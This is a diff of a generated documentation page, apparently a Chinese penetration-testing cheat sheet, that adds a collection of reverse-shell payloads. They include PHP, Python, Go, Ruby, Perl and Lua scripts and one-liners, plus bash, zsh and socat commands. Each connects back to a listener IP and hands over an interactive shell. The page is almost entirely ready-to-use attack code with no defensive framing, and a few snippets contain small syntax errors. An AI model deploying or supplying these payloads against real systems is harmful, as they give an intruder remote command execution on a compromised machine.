@@ -24,7 +24,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.a3f8f96a.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.1655a90d.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.7fa14f5b.min.css">
@@ -539,6 +539,75 @@
   <a href="#shell" class="md-nav__link">
     反弹 shell
   </a>
+  
+    <nav class="md-nav" aria-label="反弹 shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    php
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    python
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby" class="md-nav__link">
+    ruby
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#perl" class="md-nav__link">
+    perl
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lua" class="md-nav__link">
+    lua
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    java
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c" class="md-nav__link">
+    c
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gawk" class="md-nav__link">
+    gawk
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcl" class="md-nav__link">
+    tcl
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -3536,6 +3605,75 @@
     反弹 shell
   </a>
   
+    <nav class="md-nav" aria-label="反弹 shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    php
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    python
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby" class="md-nav__link">
+    ruby
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#perl" class="md-nav__link">
+    perl
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lua" class="md-nav__link">
+    lua
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    java
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c" class="md-nav__link">
+    c
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gawk" class="md-nav__link">
+    gawk
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcl" class="md-nav__link">
+    tcl
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -3653,6 +3791,289 @@
 bash -c <span class="s1">&#39;bash -i &gt;/dev/tcp/4.4.9.102/8080 0&gt;&amp;1&#39;</span>
 zsh -c <span class="s1">&#39;zmodload zsh/net/tcp &amp;&amp; ztcp 192.168.1.2 8080 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#39;</span>
 socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  <span class="c1">#4.4.9.102</span>
+</code></pre></div>
+<h3 id="php">php<a class="headerlink" href="#php" title="Permanent link">&para;</a></h3>
+<p><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span> <span class="p">(</span><span class="k">E_ERROR</span><span class="p">);</span>
+<span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$os</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
+<span class="nv">$ipaddr</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.1&#39;</span><span class="p">;</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="s1">&#39;65535&#39;</span><span class="p">;</span>
+<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">),</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">),</span><span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">));</span>
+<span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">getcwd</span><span class="p">();</span>
+<span class="nv">$msg</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">()</span> 
+<span class="k">if</span><span class="p">(</span><span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;WIN&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$env</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;path&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;c:\\windows\\system32&#39;</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$env</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;path&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;fsockopen&#39;</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ipaddr</span><span class="p">,</span><span class="nv">$port</span><span class="p">);</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span><span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="mi">1024</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;cd &#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
+            <span class="nb">chdir</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">);</span>
+            <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">getcwd</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">))</span> <span class="o">==</span> <span class="s1">&#39;exit&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$descriptorspec</span><span class="p">,</span><span class="nv">$pipes</span><span class="p">,</span><span class="nv">$cwd</span><span class="p">,</span><span class="nv">$env</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$cmd</span><span class="p">);</span>
+                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+                <span class="nv">$msg</span> <span class="o">=</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
+                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+                <span class="nv">$msg</span> <span class="o">=</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
+                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+                <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$sock</span> <span class="o">=</span> <span class="nb">socket_create</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span><span class="nx">SOCK_STREAM</span><span class="p">,</span><span class="nx">SOL_TCP</span><span class="p">);</span>
+    <span class="nb">socket_connect</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$ipaddr</span><span class="p">,</span><span class="nv">$port</span><span class="p">);</span>
+    <span class="nb">socket_write</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span><span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">socket_read</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="mi">1024</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;cd &#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
+            <span class="nb">chdir</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">);</span>
+            <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">getcwd</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">))</span> <span class="o">==</span> <span class="s1">&#39;exit&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$descriptorspec</span><span class="p">,</span><span class="nv">$pipes</span><span class="p">,</span><span class="nv">$cwd</span><span class="p">,</span><span class="nv">$env</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$cmd</span><span class="p">);</span>
+                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+                <span class="nv">$msg</span> <span class="o">=</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+                <span class="nb">socket_write</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$msg</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$msg</span><span class="p">));</span>
+                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+                <span class="nv">$msg</span> <span class="o">=</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+                <span class="nb">socket_write</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$msg</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$msg</span><span class="p">));</span>
+                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nv">$sock</span><span class="o">=</span><span class="nb">fsockopen</span><span class="p">(</span><span class="s2">&quot;192.168.0.1&quot;</span><span class="nx">，65535</span><span class="p">);</span>
+<span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>php -r <span class="s2">&quot;error_reporting(E_ERROR);ignore_user_abort(true);ini_set(&#39;max_execution_time&#39;,0);\$os=substr(PHP_OS,0,3);\$ipaddr=&#39;192.168.0.1&#39;;\$port=&#39;65535&#39;;\$descriptorspec=array(0=&gt;array(\&quot;pipe\&quot;,\&quot;r\&quot;),1=&gt;array(\&quot;pipe\&quot;,\&quot;w\&quot;),2=&gt;array(\&quot;pipe\&quot;,\&quot;w\&quot;));\$cwd=getcwd();\$msg=php_uname()if(\$os==&#39;WIN&#39;){\$env=array(&#39;path&#39;=&gt;&#39;c:\\windows\\system32&#39;);}else{\$env=array(&#39;path&#39;=&gt;&#39;/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin&#39;);}if(function_exists(&#39;fsockopen&#39;)){\$sock=fsockopen(\$ipaddr,\$port);fwrite(\$sock,\$msg);while(\$cmd=fread(\$sock,1024)){if(substr(\$cmd,0,3)==&#39;cd&#39;){\$cwd=trim(substr(\$cmd,3,-1));chdir(\$cwd);\$cwd=getcwd();}if(trim(strtolower(\$cmd))==&#39;exit&#39;){break;}else{\$process=proc_open(\$cmd,\$descriptorspec,\$pipes,\$cwd,\$env);if(is_resource(\$process)){fwrite(\$pipes[0],\$cmd);fclose(\$pipes[0]);\$msg=stream_get_contents(\$pipes[1]);fwrite(\$sock,\$msg);fclose(\$pipes[1]);\$msg=stream_get_contents(\$pipes[2]);fwrite(\$sock,\$msg);fclose(\$pipes[2]);proc_close(\$process);}}}fclose(\$sock);}else{\$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect(\$sock,\$ipaddr,\$port);socket_write(\$sock,\$msg);fwrite(\$sock,\$msg);while(\$cmd=socket_read(\$sock,1024)){if(substr(\$cmd,0,3)==&#39;cd&#39;){\$cwd=trim(substr(\$cmd,3,-1));chdir(\$cwd);\$cwd=getcwd();}if(trim(strtolower(\$cmd))==&#39;exit&#39;){break;}else{\$process=proc_open(\$cmd,\$descriptorspec,\$pipes,\$cwd,\$env);if(is_resource(\$process)){fwrite(\$pipes[0],\$cmd);fclose(\$pipes[0]);\$msg=stream_get_contents(\$pipes[1]);socket_write(\$sock,\$msg,strlen(\$msg));fclose(\$pipes[1]);\$msg=stream_get_contents(\$pipes[2]);socket_write(\$sock,\$msg,strlen(\$msg));fclose(\$pipes[2]);proc_close(\$process);}}}socket_close(\$sock);}&quot;</span>
+</code></pre></div></p>
+<h3 id="python">python<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
+<p><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;192.168.0.1&quot;</span><span class="p">,</span><span class="mi">65535</span><span class="p">))</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>python -c <span class="s2">&quot;import socket,subprocess,os;s=socket.socket();s.connect((\&quot;192.168.0.1\&quot;,65535));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;])&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="ch">#!usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="p">;</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;192.168.0.1&quot;</span><span class="p">,</span><span class="mi">65535</span><span class="p">))</span>
+<span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">):</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">subprocess</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.0.1&#39;</span><span class="p">,</span><span class="mi">65535</span><span class="p">))</span>
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>  
+    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">),</span>\
+                            <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>\
+                            <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>\
+                            <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>\
+                            <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span>\
+                            <span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">+</span><span class="n">proc</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nx">main</span><span class="p">;</span>
+<span class="kn">import</span><span class="s">&quot;os/exec&quot;</span><span class="p">;</span>
+<span class="kn">import</span><span class="s">&quot;net&quot;</span><span class="p">;</span>
+<span class="kd">func</span> <span class="nx">main</span><span class="p">(){</span>
+    <span class="nx">c</span><span class="p">,</span><span class="nx">_</span><span class="o">:=</span><span class="nx">net</span><span class="p">.</span><span class="nx">Dial</span><span class="p">(</span><span class="s">&quot;tcp&quot;</span><span class="p">,</span><span class="s">&quot;192.168.0.1:65535&quot;</span><span class="p">);</span>
+    <span class="nx">cmd</span><span class="o">:=</span><span class="nx">exec</span><span class="p">.</span><span class="nx">Command</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+    <span class="nx">cmd</span><span class="p">.</span><span class="nx">Stdin</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span>
+    <span class="nx">cmd</span><span class="p">.</span><span class="nx">Stdout</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span>
+    <span class="nx">cmd</span><span class="p">.</span><span class="nx">Stderr</span><span class="p">=</span><span class="nx">c</span><span class="p">;</span>
+    <span class="nx">cmd</span><span class="p">.</span><span class="nx">Run</span><span class="p">()}</span>
+</code></pre></div>
+<h3 id="ruby">ruby<a class="headerlink" href="#ruby" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/ruby</span>
+<span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+<span class="nb">require</span> <span class="s1">&#39;open3&#39;</span>
+    <span class="c1">#Set the Remote Host IP</span>
+<span class="no">RHOST</span> <span class="o">=</span> <span class="s2">&quot;192.168.0.1&quot;</span> 
+<span class="c1">#Set the Remote Host Port</span>
+<span class="no">PORT</span> <span class="o">=</span> <span class="s2">&quot;65535&quot;</span>
+    <span class="c1">#Tries to connect every 20 sec until it connects.</span>
+<span class="k">begin</span>
+<span class="n">sock</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="no">RHOST</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="no">PORT</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">puts</span> <span class="s2">&quot;We are connected!&quot;</span>
+<span class="k">rescue</span>
+<span class="nb">sleep</span> <span class="mi">20</span>
+<span class="k">retry</span>
+<span class="k">end</span>
+<span class="c1">#Runs the commands you type and sends you back the stdout and stderr.</span>
+<span class="k">begin</span>
+<span class="k">while</span> <span class="n">line</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">gets</span>
+    <span class="no">Open3</span><span class="o">.</span><span class="n">popen2e</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">line</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout_and_stderr</span> <span class="o">|</span>
+            <span class="no">IO</span><span class="o">.</span><span class="n">copy_stream</span><span class="p">(</span><span class="n">stdout_and_stderr</span><span class="p">,</span> <span class="n">sock</span><span class="p">)</span>
+            <span class="k">end</span>  
+<span class="k">end</span>
+<span class="k">rescue</span>
+<span class="k">retry</span>
+<span class="k">end</span>
+</code></pre></div>
+<h3 id="perl">perl<a class="headerlink" href="#perl" title="Permanent link">&para;</a></h3>
+<p><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/perl</span>
+<span class="k">use</span> <span class="nn">Socket</span><span class="p">;</span>
+<span class="nv">$i</span><span class="o">=</span><span class="s">&quot;192.168.0.1&quot;</span><span class="p">;</span>
+<span class="nv">$p</span><span class="o">=</span><span class="mi">65535</span><span class="p">;</span>
+<span class="nb">socket</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">PF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="nb">getprotobyname</span><span class="p">(</span><span class="s">&quot;tcp&quot;</span><span class="p">));</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">connect</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">sockaddr_in</span><span class="p">(</span><span class="nv">$p</span><span class="p">,</span><span class="n">inet_aton</span><span class="p">(</span><span class="nv">$i</span><span class="p">))))</span>
+<span class="p">{</span>
+    <span class="nb">open</span><span class="p">(</span><span class="bp">STDIN</span><span class="p">,</span><span class="s">&quot;&gt;&amp;S&quot;</span><span class="p">);</span>
+    <span class="nb">open</span><span class="p">(</span><span class="bp">STDOUT</span><span class="p">,</span><span class="s">&quot;&gt;&amp;S&quot;</span><span class="p">);</span>
+    <span class="nb">open</span><span class="p">(</span><span class="bp">STDERR</span><span class="p">,</span><span class="s">&quot;&gt;&amp;S&quot;</span><span class="p">);</span>
+    <span class="nb">exec</span><span class="p">(</span><span class="s">&quot;/bin/bash -i&quot;</span><span class="p">);</span>
+<span class="p">};</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/perl</span>
+<span class="nv">$p</span><span class="o">=</span><span class="nb">fork</span><span class="p">;</span>
+<span class="nb">exit</span><span class="p">,</span><span class="k">if</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span>
+<span class="nv">$c</span><span class="o">=</span><span class="k">new</span> <span class="nn">IO::Socket::</span><span class="n">INET</span><span class="p">(</span><span class="n">PeerAddr</span><span class="p">,</span><span class="s">&quot;192.168.0.1:65535&quot;</span><span class="p">);</span>
+<span class="bp">STDIN</span><span class="o">-&gt;</span><span class="n">fdopen</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="n">r</span><span class="p">);</span>
+<span class="vg">$~</span><span class="o">-&gt;</span><span class="n">fdopen</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="n">w</span><span class="p">);</span>
+<span class="nb">system</span><span class="nv">$_</span> <span class="k">while</span><span class="o">&lt;&gt;</span><span class="p">;</span>
+</code></pre></div></p>
+<h3 id="lua">lua<a class="headerlink" href="#lua" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="cp">#!/usr/bin/lua</span>
+<span class="kd">local</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s2">&quot;192.168.0.1&quot;</span><span class="p">,</span> <span class="mi">65535</span> 
+<span class="kd">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;socket&quot;</span><span class="p">)</span> 
+<span class="kd">local</span> <span class="n">tcp</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">tcp</span><span class="p">()</span> 
+<span class="kd">local</span> <span class="n">io</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;io&quot;</span><span class="p">)</span> 
+<span class="n">tcp</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">);</span> 
+<span class="kr">while</span> <span class="kc">true</span> 
+    <span class="kr">do</span> <span class="kd">local</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">status</span><span class="p">,</span> <span class="n">partial</span> <span class="o">=</span> <span class="n">tcp</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span> 
+    <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> 
+    <span class="kd">local</span> <span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;*a&quot;</span><span class="p">)</span> 
+    <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">tcp</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> 
+    <span class="kr">if</span> <span class="n">status</span> <span class="o">==</span> <span class="s2">&quot;closed&quot;</span> 
+        <span class="kr">then</span> <span class="kr">break</span> 
+        <span class="kr">end</span> 
+    <span class="kr">end</span> 
+<span class="n">tcp</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
